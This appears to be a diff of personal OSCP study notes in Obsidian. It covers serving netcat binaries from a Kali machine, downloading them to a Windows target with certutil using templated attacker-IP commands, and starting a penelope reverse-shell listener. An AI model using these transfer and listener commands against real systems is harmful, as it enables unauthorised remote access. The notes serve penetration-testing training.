@@ -9,13 +9,7 @@ dv.paragraph("```bash\n" + command + "\n```");
 ```
 [[System Architecture]]
 
-nc.exe > 32 bit
-nc64.exe > 64 bit
-
-```
-cd ~/Desktop/Tools/NC && python -m http.server 80
-```
-#### Download
+SKIP
 
 nc.exe
 ```
@@ -62,28 +56,22 @@ wmic os get osarchitecture
 
 Start a listener on KALI ATTACKER
 ```
-cd ~/Desktop/Tools && python3 penelope.py -p 135 -O / --oscp-safe
+penelope -p 135
 ```
 
 Transfer [[Netcat.exe]] to target
 nc.exe > 32 bit
 nc64.exe > 64 bit
 
-Copy nc.exe to current dir & listener
 ```
-cd ~/Desktop/Tools/NC/ && python -m http.server 80
-```
-
-Copy nc64.exe to current dir & listener
-```
-cd ~/Desktop/Tools/NC/ && python -m http.server 80
+python -m http.server 80 --directory ~/Desktop/Tools/NC/
 ```
 
 nc.exe
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
-const command = `C:\\\Windows\\\System32\\\certutil.exe -urlcache -split -f http://${KaliIP}/nc.exe C:\\\Windows\\\Tasks\\nc.exe`;
+const command = `C:\\\Windows\\\System32\\\certutil.exe -urlcache -split -f http://${KaliIP}/nc.exe nc.exe`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
@@ -91,7 +79,7 @@ nc64.exe
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
-const command = `C:\\\Windows\\\System32\\\certutil.exe -urlcache -split -f http://${KaliIP}/nc64.exe C:\\\Windows\\\Tasks\\nc.exe`;
+const command = `C:\\\Windows\\\System32\\\certutil.exe -urlcache -split -f http://${KaliIP}/nc64.exe nc.exe`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
